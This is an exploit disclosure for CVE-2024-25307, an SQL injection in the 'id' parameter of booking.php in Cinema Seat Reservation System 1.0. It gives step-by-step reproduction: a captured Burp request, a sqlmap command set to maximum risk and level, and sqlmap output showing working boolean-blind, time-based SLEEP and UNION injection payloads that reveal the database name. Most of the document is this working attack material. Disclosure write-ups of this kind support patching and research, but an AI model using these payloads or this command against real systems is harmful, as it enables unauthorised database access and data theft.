# CVE-2024-25307 - Cinema Seat Reservation System - SQL Injection
+ **Exploit Title:** Cinema Seat Reservation System - SQL Injection
+ **Date:** 2024-01-02
+ **Exploit Author:** Tuba Kavgacı
+ **Vendor Homepage:** https://code-projects.org/cinema-seat-reservation-system-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/1d68ab6b-6fd7-4c5f-a125-268d8ecbce07
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** CVE-2024-25307

## Description:
Cinema Seat Reservation System 1.0 allows SQL Injection via the 'id' parameter at "/Cinema-Reservation/booking.php?id=1". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "/Cinema-Reservation/"
+ Click on any movie poster
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /Cinema-Reservation/booking.php?id=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```

+ Use sqlmap to exploit. In sqlmap, use 'id' parameter to dump the database.
```
sqlmap -r r.txt -p id --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 9842=9842

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3036 FROM (SELECT(SLEEP(5)))fUdC)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: id=-1021 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171767871,0x43464842634f6a684a635167706d5868724f6a6c4f7972536257434354776d4b6c64484544534e48,0x7178627071),NULL,NULL-- -
---
[07:46:45] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[07:46:45] [INFO] fetching current database
current database: 'cinema_db'
```
+ current database: `cinema_db`

![Ekran görüntüsü 2024-02-01 160105](https://github.com/tubakvgc/CVEs/assets/74067343/461638fb-1a49-4473-a412-047aa427d25c)
